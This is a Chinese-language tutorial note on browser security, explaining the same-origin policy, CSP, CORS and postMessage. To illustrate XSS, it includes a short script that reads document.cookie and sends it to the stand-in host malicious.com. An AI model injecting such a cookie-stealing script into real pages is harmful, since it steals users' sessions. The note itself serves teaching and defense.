* `浏览器安全可以分为三大块—— Web页面安全  浏览器网络安全 和 浏览器系统安全`

* `在没有安全保障的Web世界中,我们是没有隐私的,因此需要安全策略来保障我们的隐私和数据安全。`
* 页面中最基础、最核心的安全策略:`同源策略(Same-origin-policy)`

# 什么是同源策略

* `如果两个URL的协议、域名 和 端口号都相同,我们就称这两个URL同源。`
* 浏览器默认两个相同的源之间是可以相互访问资源和操作DOM的。两个不同的源之间若想要相互访问资源或者操作DOM,那么会有一套基础的安全策略的制约,我们把这称为同源策略。

* 具体来讲,同源策略主要表现在DOM Web数据和网络这三个层面。

1. `DOM层面`。同源策略限制了来自不同源的javascript脚本对当前DOM对象读取和写的操作

```

{
let pdom = opener.document
pdom.body.style.display = "none"
}

```
* 对象opener 就是指向第一个页面的window对象,我们可以通过操作opener来控制第一个页面中的DOM
* 不同源页面两个页面不能相互操作DOM  
```

Blocked a frame with origin "https://www.infoq.cn" from accessing a cross-origin frame.

```
2. 数据层面同源策略限制了不同源的站点读取当前站点的Cookie  IndexDB  LocalStorage等数据。
3. 网络层面。同源策略限制了通过XMLHttpRequest等方式将站点的数据发送给不同源的站点。

# 安全和便利性的权衡
* 浏览器出让了同源策略的哪些安全性?
1. 页面中可以嵌套第三方资源
* 最常见的是恶意程序通过各种途径往HTML文件中插入恶意脚本。脚本就可以篡改页面,获取页面敏感数据,如Cookie IndexDB LocalStorage等数据通过XSS的手段发送给服务器。
```
   
function onClick(){
  let url = `http://malicious.com?cookie = ${document.cookie}`
  open(url)
}
onClick()

```
* 为了解决XSS攻击,浏览器中引入了内容安全策略,称为`CSP`。`CSP的核心思想是让服务器决定浏览器能够加载哪些资源,让服务器决定浏览器是否能够执行内联JS代码。` 可以减少XSS攻击。
2. 跨域资源共享和跨文档消息机制
* `跨域资源共享(CORS)` 使用该机制可以进行跨域访问控制,从而使跨域数据传输得以安全进行。
* 浏览器引入 `跨文档消息机制` 可以通过window.postMessage的js接口来和不同源的DOM进行通信。

# 总结
* 同源策略会隔离不同源的DOM 页面数据和网络通信  进而实现Web页面的安全性。

* 在安全和便利之间权衡,得到的安全策略原型。总结起来，它具备以下三个特点：
1. 页面中可以引用第三方资源,不过这也暴露了很多诸如XSS的安全问题,因此又在这种开放的基础上引入了CSP来限制其自由度。
2. 使用XMLHttpRequest和Fectch都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础上引入了`跨域资源共享策略` 让其可以安全进行跨域操作。
3. 两个不同源的DOM是不能相互操作的,因此,浏览器中又实现了跨文档消息机制(window.postMessage)，让其可以比较安全地通信。